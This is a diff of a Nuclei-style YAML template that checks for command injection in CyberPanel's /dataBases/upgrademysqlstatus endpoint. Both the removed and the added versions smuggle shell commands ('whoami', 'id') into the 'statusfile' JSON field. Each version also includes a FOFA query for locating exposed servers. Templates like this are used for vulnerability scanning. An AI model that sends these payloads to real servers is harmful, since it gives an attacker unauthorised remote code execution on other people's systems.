@@ -1,44 +1,28 @@
-id: cyberpanel-upgrademysqlstatus-rce
-
-info:
-  name: CyberPanel upgrademysqlstatus Remote Code Execution
-  author: Co5mos
-  severity: critical
-  description: Exploits a CSRF token-based RCE vulnerability by injecting commands.
-  metadata:
-    fofa-query: CyberPanel
-  tags: cyberpanel, rce
-
-variables:
-  cmd: "whoami"
-
 http:
-  - raw:
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
+- matchers:
+  - dsl:
+    - status_code==200 && contains_all(body,"uid=") && contains_all(body,"gid=")
+    type: dsl
+  raw:
+  - 'GET /dataBases/upgrademysqlstatus HTTP/1.1
 
-      - |
-        PUT /dataBases/upgrademysqlstatus HTTP/1.1
-        Host: {{Hostname}}
-        X-CSRFToken: {{csrf_token}}
-        Content-Type: application/json
-        Referer: {{BaseURL}}
+    Host: {{Hostname}}
 
-        {"statusfile":"/dev/null; {{cmd}}; #","csrftoken":"{{csrf_token}}"}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101
+    Firefox/131.0
 
-    extractors:
-      - type: regex
-        name: csrf_token
-        part: header_1
-        internal: true
-        group: 1
-        regex:
-          - 'csrftoken=(.+?);'
+    Content-Type: application/json
 
-    matchers:
-      - type: dsl
-        dsl:
-          - status_code_1 == 200 && status_code_2 == 200
-          - regex("\"requestStatus\":.\".*\"", body_2)
-        condition: and
+    Connection: close
+
+
+    {"statusfile":"1;id;#"}
+
+    '
+id: cyberpanel-upgrademysqlstatus-rce
+info:
+  author: PokerSec
+  metadata:
+    fofasearch: app="CyberPanel"
+  name: cyberpanel-upgrademysqlstatus-rce
+  severity: critical
